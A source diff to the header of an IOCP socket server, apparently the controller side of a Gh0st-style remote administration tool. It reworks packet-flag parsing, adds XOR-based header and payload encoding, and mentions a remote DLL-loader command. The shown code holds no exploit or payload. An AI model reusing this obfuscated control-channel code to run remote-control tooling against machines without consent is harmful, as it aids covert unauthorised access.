@@ -1,5 +1,6 @@
 #pragma once
 
+#include "StdAfx.h"
 #include <WinSock2.h>
 #pragma comment(lib,"ws2_32.lib")
 #include "CpuUseage.h"
@@ -12,15 +13,15 @@
 #endif
 
 #include <Mstcpip.h>
+#include "common/header.h"
+#include "common/encrypt.h"
 #define PACKET_LENGTH   0x2000
-
-#define FLAG_LENGTH   5
-#define HDR_LENGTH   13
 
 #define	NC_CLIENT_CONNECT		0x0001
 #define	NC_RECEIVE				0x0004
 #define NC_RECEIVE_COMPLETE		0x0005 // 完整接收
 
+std::string GetPeerName(SOCKET sock);
 std::string GetRemoteIP(SOCKET sock);
 
 
@@ -40,43 +41,6 @@ enum
 	ONLINELIST_CLIENTTYPE,		// 客户端类型
 	ONLINELIST_PATH,			// 文件路径
 	ONLINELIST_MAX,
-};
-
-// Encoder interface. The default encoder will do nothing.
-class Encoder {
-public:
-	virtual ~Encoder(){}
-	// Encode data before compress.
-	virtual void Encode(unsigned char* data, int len) const{}
-	// Decode data after uncompress.
-	virtual void Decode(unsigned char* data, int len) const{}
-};
-
-// XOR Encoder implementation.
-class XOREncoder : public Encoder {
-private:
-	std::vector<char> Keys;
-
-public:
-	XOREncoder(const std::vector<char>& keys = {0}) : Keys(keys){}
-
-	virtual void Encode(unsigned char* data, int len) const {
-		XOR(data, len, Keys);
-	}
-
-	virtual void Decode(unsigned char* data, int len) const {
-		static std::vector<char> reversed(Keys.rbegin(), Keys.rend());
-		XOR(data, len, reversed);
-	}
-
-protected:
-	void XOR(unsigned char* data, int len, const std::vector<char> &keys) const {
-		for (char key : keys) {
-			for (int i = 0; i < len; ++i) {
-				data[i] ^= key;
-			}
-		}
-	}
 };
 
 enum {
@@ -114,57 +78,75 @@ protected:
 		Reset();
 	}
 	PR Parse(CBuffer& buf, int &compressMethod) {
-		const int MinimumCount = 8;
+		const int MinimumCount = MIN_COMLEN;
 		if (buf.GetBufferLength() < MinimumCount) {
 			return PR{ PARSER_NEEDMORE };
 		}
 		char szPacketFlag[32] = { 0 };
 		buf.CopyBuffer(szPacketFlag, MinimumCount, 0);
+		HeaderEncType encTyp = HeaderEncUnknown;
+		FlagType flagType = CheckHead(szPacketFlag, encTyp);
+		if (flagType == FLAG_UNKNOWN) {
+			return PR{ PARSER_FAILED };
+		}
 		if (m_bParsed) { // Check if the header has been parsed.
 			return memcmp(m_szPacketFlag, szPacketFlag, m_nCompareLen) == 0 ? PR{ m_nFlagLen } : PR{ PARSER_FAILED };
 		}
 		// More version may be added in the future.
-		const char version0[] = "Shine", version1[] = "<<FUCK>>", version2[] = "Hello?", version3[] = "HELL";
-		if (memcmp(version0, szPacketFlag, sizeof(version0) - 1) == 0) {
-			memcpy(m_szPacketFlag, version0, sizeof(version0) - 1);
-			m_nCompareLen = strlen(m_szPacketFlag);
+		switch (m_nFlagType = flagType)
+		{
+		case FLAG_UNKNOWN:
+			return PR{ PARSER_FAILED };
+		case FLAG_SHINE:
+			memcpy(m_szPacketFlag, szPacketFlag, 5);
+			m_nCompareLen = 5;
 			m_nFlagLen = m_nCompareLen;
 			m_nHeaderLen = m_nFlagLen + 8;
 			m_bParsed = TRUE;
 			m_Encoder = new Encoder();
-		}
-		else if (memcmp(version1, szPacketFlag, sizeof(version1) - 1) == 0) {
-			memcpy(m_szPacketFlag, version1, sizeof(version1) - 1);
-			m_nCompareLen = strlen(m_szPacketFlag);
+			m_Encoder2 = new Encoder();
+			break;
+		case FLAG_FUCK:
+			memcpy(m_szPacketFlag, szPacketFlag, 8);
+			m_nCompareLen = 8;
 			m_nFlagLen = m_nCompareLen + 3;
 			m_nHeaderLen = m_nFlagLen + 8;
 			m_bParsed = TRUE;
 			m_Encoder = new XOREncoder();
-		}
-		else if (memcmp(version2, szPacketFlag, sizeof(version2) - 1) == 0) {
-			memcpy(m_szPacketFlag, version2, sizeof(version2) - 1);
-			m_nCompareLen = strlen(m_szPacketFlag);
+			m_Encoder2 = new Encoder();
+			break;
+		case FLAG_HELLO:
+			// This header is only for handling SOCKET_DLLLOADER command
+			memcpy(m_szPacketFlag, szPacketFlag, 8);
+			m_nCompareLen = 6;
 			m_nFlagLen = 8;
 			m_nHeaderLen = m_nFlagLen + 8;
 			m_bParsed = TRUE;
 			compressMethod = COMPRESS_NONE;
 			m_Encoder = new Encoder();
-		}
-		else if (memcmp(version3, szPacketFlag, sizeof(version3) - 1) == 0) {
-			memcpy(m_szPacketFlag, version3, sizeof(version3) - 1);
-			m_nCompareLen = strlen(m_szPacketFlag);
-			m_nFlagLen = 8;
+			m_Encoder2 = new XOREncoder16();
+			break;
+		case FLAG_HELL:
+			// This version
+			memcpy(m_szPacketFlag, szPacketFlag, 8);
+			m_nCompareLen = FLAG_COMPLEN;
+			m_nFlagLen = FLAG_LENGTH;
 			m_nHeaderLen = m_nFlagLen + 8;
 			m_bParsed = TRUE;
 			m_Encoder = new Encoder();
-		}
-		else {
-			return PR{ PARSER_FAILED };
+			m_Encoder2 = new XOREncoder16();
+			break;
+		default:
+			break;
 		}
 		return PR{ m_nFlagLen };
 	}
+	BOOL IsEncodeHeader() const {
+		return m_nFlagType == FLAG_HELLO || m_nFlagType == FLAG_HELL;
+	}
 	HeaderParser& Reset() {
 		SAFE_DELETE(m_Encoder);
+		SAFE_DELETE(m_Encoder2);
 		memset(this, 0, sizeof(HeaderParser));
 		return *this;
 	}
@@ -183,13 +165,18 @@ protected:
 	Encoder* GetEncoder() const {
 		return m_Encoder;
 	}
+	Encoder* GetEncoder2() const {
+		return m_Encoder2;
+	}
 private:
 	BOOL				m_bParsed;					// 数据包是否可以解析
 	int					m_nHeaderLen;				// 数据包的头长度
 	int					m_nCompareLen;				// 比对字节数
 	int					m_nFlagLen;					// 标识长度
+	FlagType			m_nFlagType;				// 标识类型
 	char				m_szPacketFlag[32];			// 对比信息
 	Encoder*			m_Encoder;					// 编码器
+	Encoder*			m_Encoder2;					// 编码器2
 };
 
 enum IOType 
@@ -219,13 +206,15 @@ typedef struct CONTEXT_OBJECT
 
 	BOOL				m_bProxyConnected;			// 代理是否连接
 	BOOL 				bLogin;						// 是否 login
+	std::string			PeerName;					// 对端IP
 
-	VOID InitMember()
+	VOID InitMember(SOCKET s)
 	{
 		memset(szBuffer, 0, sizeof(char) * PACKET_LENGTH);
 		v1 = 0;
 		hDlg = NULL;
-		sClientSocket = INVALID_SOCKET;
+		sClientSocket = s;
+		PeerName = ::GetPeerName(sClientSocket);
 		memset(&wsaInBuf, 0, sizeof(WSABUF));
 		memset(&wsaOutBuffer, 0, sizeof(WSABUF));
 		olps = NULL;
@@ -243,16 +232,41 @@ typedef struct CONTEXT_OBJECT
 			sClientInfo[i] = s[i];
 		}
 	}
+	PBYTE GetBuffer(int offset) {
+		return InDeCompressedBuffer.GetBuffer(offset);
+	}
+	ULONG GetBufferLength() {
+		return InDeCompressedBuffer.GetBufferLength();
+	}
+	std::string GetPeerName() const {
+		return PeerName;
+	}
 	CString GetClientData(int index) const{
 		return sClientInfo[index];
+	}
+	void CancelIO() {
+		SAFE_CANCELIO(sClientSocket);
+	}
+	BOOL CopyBuffer(PVOID pDst, ULONG nLen, ULONG ulPos) {
+		return InDeCompressedBuffer.CopyBuffer(pDst, nLen, ulPos);
+	}
+	BYTE GetBYTE(int offset) {
+		return InDeCompressedBuffer.GetBYTE(offset);
 	}
 	// Write compressed buffer.
 	void WriteBuffer(LPBYTE data, ULONG dataLen, ULONG originLen) {
 		if (Parser.IsParsed()) {
 			ULONG totalLen = dataLen + Parser.GetHeaderLen();
-			OutCompressedBuffer.WriteBuffer((LPBYTE)Parser.GetFlag(), Parser.GetFlagLen());
+			BYTE szPacketFlag[32] = {};
+			const int flagLen = Parser.GetFlagLen();
+			memcpy(szPacketFlag, Parser.GetFlag(), flagLen);
+			if (Parser.IsEncodeHeader())
+				encrypt(szPacketFlag, FLAG_COMPLEN, szPacketFlag[flagLen - 2]);
+			OutCompressedBuffer.WriteBuffer((LPBYTE)szPacketFlag, flagLen);
 			OutCompressedBuffer.WriteBuffer((PBYTE)&totalLen, sizeof(ULONG));
 			OutCompressedBuffer.WriteBuffer((PBYTE)&originLen, sizeof(ULONG));
+			InDeCompressedBuffer.CopyBuffer(szPacketFlag + flagLen, 16, 16);
+			Encode2(data, dataLen, szPacketFlag);
 			OutCompressedBuffer.WriteBuffer(data, dataLen);
 		}
 	}
@@ -260,13 +274,14 @@ typedef struct CONTEXT_OBJECT
 	PBYTE ReadBuffer(ULONG &dataLen, ULONG &originLen) {
 		if (Parser.IsParsed()) {
 			ULONG totalLen = 0;
-			char szPacketFlag[32] = {};
+			BYTE szPacketFlag[32] = {};
 			InCompressedBuffer.ReadBuffer((PBYTE)szPacketFlag, Parser.GetFlagLen());
 			InCompressedBuffer.ReadBuffer((PBYTE)&totalLen, sizeof(ULONG));
 			InCompressedBuffer.ReadBuffer((PBYTE)&originLen, sizeof(ULONG));
 			dataLen = totalLen - Parser.GetHeaderLen();
 			PBYTE CompressedBuffer = new BYTE[dataLen];
 			InCompressedBuffer.ReadBuffer(CompressedBuffer, dataLen);
+			Decode2(CompressedBuffer, dataLen, szPacketFlag);
 			return CompressedBuffer;
 		}
 		return nullptr;
@@ -282,6 +297,14 @@ typedef struct CONTEXT_OBJECT
 	// Decode data after uncompress.
 	void Decode(PBYTE data, int len) const {
 		Parser.GetEncoder()->Decode((unsigned char*)data, len);
+	}
+	// Encode data after compress.
+	void Encode2(PBYTE data, int len, PBYTE param) const {
+		Parser.GetEncoder2()->Encode((unsigned char*)data, len, param);
+	}
+	// Decode data before uncompress.
+	void Decode2(PBYTE data, int len, PBYTE param) const {
+		Parser.GetEncoder2()->Decode((unsigned char*)data, len, param);
 	}
 	std::string RemoteAddr() const {
 		sockaddr_in  ClientAddr = {};
@@ -346,7 +369,7 @@ public:
 	//上下背景文对象
 	ContextObjectList				m_ContextConnectionList;
 	ContextObjectList               m_ContextFreePoolList;
-	PCONTEXT_OBJECT AllocateContext();
+	PCONTEXT_OBJECT AllocateContext(SOCKET s);
 	VOID RemoveStaleContext(CONTEXT_OBJECT* ContextObject);
 	VOID MoveContextToFreePoolList(CONTEXT_OBJECT* ContextObject);
 
@@ -367,6 +390,9 @@ public:
 	BOOL OnClientReceiving(PCONTEXT_OBJECT  ContextObject, DWORD dwTrans);  
 	VOID OnClientPreSending(CONTEXT_OBJECT* ContextObject, PBYTE szBuffer , size_t ulOriginalLength);
 	VOID Send(CONTEXT_OBJECT* ContextObject, PBYTE szBuffer, ULONG ulOriginalLength) {
+		OnClientPreSending(ContextObject, szBuffer, ulOriginalLength);
+	}
+	VOID Send2Client(CONTEXT_OBJECT* ContextObject, PBYTE szBuffer, ULONG ulOriginalLength) {
 		OnClientPreSending(ContextObject, szBuffer, ulOriginalLength);
 	}
 	BOOL OnClientPostSending(CONTEXT_OBJECT* ContextObject,ULONG ulCompressedLength);
@@ -417,3 +443,39 @@ typedef CONTEXT_OBJECT ClientContext;
 
 #define m_Socket sClientSocket
 #define m_DeCompressionBuffer InDeCompressedBuffer
+
+// 所有动态创建的对话框的基类
+class CDialogBase : public CDialog {
+public:
+	CONTEXT_OBJECT* m_ContextObject;
+	IOCPServer* m_iocpServer;
+	CString m_IPAddress;
+	bool m_bIsClosed;
+	HICON m_hIcon;
+	CDialogBase(UINT nIDTemplate, CWnd* pParent, IOCPServer* pIOCPServer, CONTEXT_OBJECT* pContext, int nIcon) :
+		m_bIsClosed(false),
+		m_ContextObject(pContext),
+		m_iocpServer(pIOCPServer),
+		CDialog(nIDTemplate, pParent) {
+
+		sockaddr_in  sockAddr;
+		memset(&sockAddr, 0, sizeof(sockAddr));
+		int nSockAddrLen = sizeof(sockaddr_in);
+		BOOL bResult = getpeername(m_ContextObject->sClientSocket, (SOCKADDR*)&sockAddr, &nSockAddrLen);
+
+		m_IPAddress = bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "";
+		m_hIcon = nIcon > 0 ? LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(nIcon)) : NULL;
+	}
+
+public:
+	virtual void OnReceiveComplete(void) = 0;
+	void OnClose() {
+		CDialog::OnClose();
+		m_bIsClosed = true;
+#if CLOSE_DELETE_DLG
+		delete this;
+#endif
+	}
+};
+
+typedef CDialogBase DialogBase;
